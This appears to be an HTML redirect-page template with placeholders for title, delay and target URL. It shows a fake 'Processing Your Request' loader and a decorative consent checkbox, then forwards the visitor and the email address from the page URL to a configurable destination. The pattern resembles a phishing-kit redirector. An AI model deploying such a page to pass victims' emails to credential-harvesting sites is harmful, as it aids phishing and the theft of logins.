<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{TITLE}}</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #4285f4;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2rem;
            font-weight: bold;
        }
        
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
            font-size: 1.8rem;
        }
        
        .loading {
            margin: 30px 0;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #f0f0f0;
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4285f4, #34a853);
            width: 0%;
            animation: progress {{DELAY}}ms ease-out forwards;
        }
        
        @keyframes progress {
            to { width: 100%; }
        }
        
        .message {
            color: #666;
            margin: 20px 0;
            line-height: 1.5;
        }
        
        .checkbox-container {
            margin: 30px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        
        .checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #4285f4;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }
        
        .checkbox:hover {
            background: #f8f9fa;
        }
        
        .checkbox.checked {
            background: #4285f4;
            color: white;
        }
        
        .checkbox-label {
            color: #555;
            cursor: pointer;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸš€</div>
        <h1>Processing Your Request</h1>
        
        <div class="loading">
            <div class="spinner"></div>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
        </div>
        
        <div class="message">
            Please wait while we prepare your content...<br>
            <small>This should only take a moment.</small>
        </div>
        
        <div class="checkbox-container">
            <div class="checkbox" id="agreeCheckbox" onclick="handleCheckboxClick(this)">
                <span id="checkmark" style="display: none;">âœ“</span>
            </div>
            <label class="checkbox-label" onclick="toggleCheckbox()">
                I agree to continue
            </label>
        </div>
    </div>

    <script>
        let redirectExecuted = false;
        
        document.addEventListener('DOMContentLoaded', function() {
            // Auto-redirect after delay
            setTimeout(performRedirect, {{DELAY}});
            
            // Progress bar animation is handled by CSS
            console.log('Page loaded, redirect scheduled in {{DELAY}}ms');
        });

        function performRedirect() {
            if (redirectExecuted) return;
            redirectExecuted = true;
            
            const email = getParameterByName('email');
            let redirectUrl = "{{REDIRECT_URL}}";
            
            if (email) {
                // Append email if provided
                const separator = redirectUrl.includes('?') ? '&' : '?';
                redirectUrl += separator + 'email=' + encodeURIComponent(email);
            }
            
            console.log("Redirecting to:", redirectUrl);
            window.location.href = redirectUrl;
        }

        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            const results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        function toggleCheckbox() {
            const checkbox = document.getElementById('agreeCheckbox');
            const checkmark = document.getElementById('checkmark');
            
            if (checkbox.classList.contains('checked')) {
                checkbox.classList.remove('checked');
                checkmark.style.display = 'none';
            } else {
                checkbox.classList.add('checked');
                checkmark.style.display = 'inline';
                // Immediate redirect when checked
                setTimeout(performRedirect, 500);
            }
        }

        function handleCheckboxClick(checkbox) {
            toggleCheckbox();
        }
    </script>
</body>
</html>
